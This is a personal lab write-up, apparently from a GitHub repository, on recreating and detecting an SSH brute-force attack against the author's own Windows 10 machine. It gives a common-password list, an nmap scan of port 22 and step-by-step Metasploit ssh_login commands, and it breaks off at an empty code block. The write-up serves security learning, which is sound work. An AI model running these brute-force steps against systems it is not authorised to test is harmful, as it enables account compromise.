# Windows Brute force investigation.

This file shows how I recreated and investigated a brute force attack using **Metasploit** on a Kali linux virtual machine to attack my Windows 10 vulnerable machine using SSH. I recreated this type of attack to get a better understanding of how logs can be used to identify if a system has been attacked.

**What is a brute force attack?**  
A brute force attack is when an attacker attempts to get access to a machine by testing different passwords. These passwords are usually a list of the most common passwords or passwords taken from a data breach (credential stuffing) in hopes that the user has used a simple password or has reused their password across different sites. These passwords are usually tested automatically with a script or tool such as **metasploit** or **hydra**.

**How do you identify a brute force attack?**  
Repeated failed authentication attempts in a short period of time for the same user.

**What would be a false positive for a brute force attack?**
A user who has forgotten their password but instead of resetting the password, they try different variations of their password in an attempt to get access to their account/device. Their constant attempt at guessing will trigger an alert of a brute force (if setup correctly) and lockout the users account/device.

**How do you prevent brute force attacks?**  
Configuring the password difficulty rules to prevent users reusing simple passwords. For example, we can configure a password history rule so the user cannot reuse their previous password. We can also configure a rule that requires the user to enter a password that is longer than the standard 8 length password which increases the difficulty of cracking the password.

We also need to configure rate-limiting the machine to lock down (either for a set period of time or until IT help desk unlocks the device) after a set amount of failed authentication attempts. This will restrict the amount of times an attacker can guess the password before being locked out of the device.

We can also use MFA (multi-factor authentication) to require the user to provide another form of authentication when logging in.

**What is SSH?**
SSH (Secure Shell) is a "cryptographic network protocol" that is used to get remote access to a device on a network.

-----

### My setup:

**Attack machine:**  
Operating System: Kali Linux 10.4  
Specific Applications: Metasploit framework  

**Windows vulnerable machine:**  
Operating System: Windows 10
Specific tools enabled: SSH (Password authentication)

For more information on how I created my attack machine, see my **Kali Linux Attack VM** repository [here](https://github.com/OliverStone01/Security-lab/blob/main/setup/kali-linux-vm-setup.md).

To be able to access my network via my attack machine, I had to change my network settings to `bridged`.

<img alt="Bridged network" src="/learning/logs/images/bridged network.png" width=500px>

-----

### Creating my password list

On my attack VM, I created a text document with 10 passwords to test (9 of the most used passwords and the correct password).

```
$ nano ~/passwords.txt

123456
password
123456789
qwerty
12345
111111
123123
admin
iloveyou
***********
```

-----

### Setting up the vulnerable device:

To setup the device, I installed a fresh version of Windows 10 onto an old laptop using a Windows 10 USB boot key I made. Once the device was setup with a basic local user account and SSH activated, I begun searching for the device on my attack machine.

If you want to know how to setup SSH on Windows, you can see my guide [here.](https://github.com/OliverStone01/Security-lab/blob/main/setup/windows-ssh-setup.md)


-----

### Reconnaissance (Scanning for the vulnerable machine)

Before I could attack my victim device via SSH, I first needed to find the device on my network. To do this, I searched what my IP range was by using `ip a` on my attack VM.
```
$ ip a
```

<img alt="ip a scan" src="/learning/logs/images/ip a scan.png" width=600px>

To get the IP range, you need to look under `eth0` for `inet x.x.x.x/x`

> - `eth` = ethernet, `0` = first, `eth0` = the first ethernet interface.
> - `inet` - internet protocol (IPv4)

Once I had the IP range, I could use nmap to scan the range for devices that are using port 22 (commonly used by SSH):
```
$ nmap -p 22 x.x.x.x/x
```

<img alt="nmap scan results" src="/learning/logs/images/nmap-scan-for-windows-device.png" width=600px>

By looking at the results of the scan, I could see the vulnerable device was displaying port 22 as `open`.

-----

### The attack

To start my attack, I started **Metasploit** on my attack VM:
```
msfconsole
```

Once **Metasploit** has loaded (you will see `msf6 >`), I selected the SSH brute-force module:
```
msf6 > use auxiliary/scanner/ssh/ssh_login
```

> To see all configuration options, you can do `show options` and you will see a list of all the options you can edit:
> ```
> msf6 > auxiliary(scanner/ssh/ssh_login) > show options
> ```

To configure the attack, we need to adjust the following options:

- Set target IP address (RHOSTS):
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set RHOSTS x.x.x.x
```

- Set the username of the user you are trying to login with:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set USERNAME xxxxx
```

- Set the password list (PASS_FILE):
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/attackVM/passwords.txt
```

- Set `STOP_ON_SUCCESS` to stop running when the correct password is found:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
```

- If you want to see all attempts printed out, you can set `VERBOSE` mode to `True`:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
```

Once all options have been set, run the Brute force attack:
```
msf6 > auxiliary(scanner/ssh/ssh_login) > run
```

Metasploit will now attempt each password and create a SSH session on the device:  

<img alt="Metasploit running bruteforce attack" src="/learning/logs/images/metasploit-bruteforce-running.png" width=500px>

-----

### Getting caught

When I performed this attack, I did not get a successful SSH login. This is because the vulnerable machine had detected my brute force attack by detecting the amount of failed SSH attempts and blocked my attack machines IP address.

I confirmed this by running the following command on the vulnerable device:
```

```